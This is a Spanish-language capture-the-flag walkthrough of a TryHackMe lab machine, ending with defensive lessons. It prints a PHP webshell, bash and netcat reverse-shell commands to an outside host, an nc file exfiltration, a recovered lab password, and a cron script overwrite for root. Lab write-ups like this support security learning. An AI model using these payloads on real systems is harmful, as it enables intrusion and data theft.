## 📊 Información de la máquina

|Campo|Valor|
|---|---|
|Plataforma|TryHackMe|
|Dificultad|Easy|
|Sistema Operativo|Linux (Ubuntu)|
|Tipo|Boot2Root|
|Vector de ataque|FTP → Web Upload → Reverse Shell → PCAP → PrivEsc Cron|

---

## 🎯 Objetivo

Comprometer la máquina y obtener:

- user.txt
    
- root.txt
    

---

# 🔎 1. Enumeración inicial

## 🔹 Escaneo con Nmap

```bash
nmap -sV 10.130.128.220
```

### Resultado:

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18
```

📌 Conclusión:

- FTP permite acceso anónimo
    
- Servicio web disponible
    

---

# 📁 2. Enumeración FTP

```bash
ftp 10.130.128.220
```

Login:

```
anonymous
```

### Archivos encontrados:

```
important.jpg
notice.txt
ftp/
```

📌 Conclusión:

- Posible vector de subida de archivos
    

---

# 💣 3. Subida de Webshell

Se sube una shell PHP:

```php
<?php system($_GET['cmd']); ?>
```

Acceso vía navegador:

```
http://10.130.128.220/files/ftp/shell.php?cmd=id
```

✔ Ejecución remota confirmada

---

# 🎧 4. Reverse Shell

## Listener

```bash
nc -lvnp 4444
```

## Payload

```
http://10.130.128.220/files/ftp/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.130.29/4444 0>&1'
```

✔ Shell obtenida como:

```
www-data
```

---

# 🔍 5. Enumeración interna

Se descubre:

```bash
/incidents/suspicious.pcapng
```

---

# 📥 6. Extracción del PCAP

En Kali:

```bash
nc -lvnp 4445 > suspicious.pcapng
```

En la víctima:

```bash
nc 192.168.130.29 4445 < /incidents/suspicious.pcapng
```

---

# 🔎 7. Análisis del PCAP

```bash
wireshark suspicious.pcapng
```

Se analiza el tráfico TCP → reverse shell capturada

Se identifica:

```
[sudo] password for www-data:
c4ntg3t3n0ughsp1c3
```

📌 Credenciales reutilizadas

---

# 🔓 8. Acceso a usuario lennie

```bash
su lennie
```

Password:

```
c4ntg3t3n0ughsp1c3
```

✔ Acceso conseguido

---

# 🏁 9. Obtener user.txt

```bash
cat /home/lennie/user.txt
```

---

# 💣 10. Privilege Escalation

## 🔍 Enumeración

```bash
ls -la /home/lennie/scripts
```

### Archivos:

```
planner.sh
startup_list.txt
```

---

## 🔍 Análisis

```bash
cat planner.sh
```

```
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

---

## 🔍 Script crítico

```bash
ls -l /etc/print.sh
```

```
-rwx------ 1 lennie lennie /etc/print.sh
```

📌 Conclusión:

- Script ejecutado por root
    
- Editable por lennie
    
- Privilege escalation directa
    

---

# 🚀 11. Explotación

Se sobrescribe el script:

```bash
echo 'nc 192.168.130.29 4446 -e /bin/bash' > /etc/print.sh
```

---

## 🎧 Listener

```bash
nc -lvnp 4446
```

---

## ⏱ Ejecución

Cron ejecuta el script → conexión entrante

✔ Shell como root obtenida

---

# 🏁 12. Obtener root.txt

```bash
cat /root/root.txt
```

---

# 🧠 Conclusiones

## 🔑 Técnicas utilizadas

- Enumeración (Nmap)
    
- FTP anonymous access
    
- File upload exploitation
    
- Webshell
    
- Reverse shell
    
- Análisis de tráfico (PCAP)
    
- Reutilización de credenciales
    
- Privilege escalation (misconfigured script + cron)
    

---

## ⚠️ Lecciones clave

- FTP con permisos de escritura es crítico
    
- Los PCAP pueden contener credenciales sensibles
    
- Las contraseñas reutilizadas son un riesgo grave
    
- Scripts ejecutados por root deben tener permisos estrictos
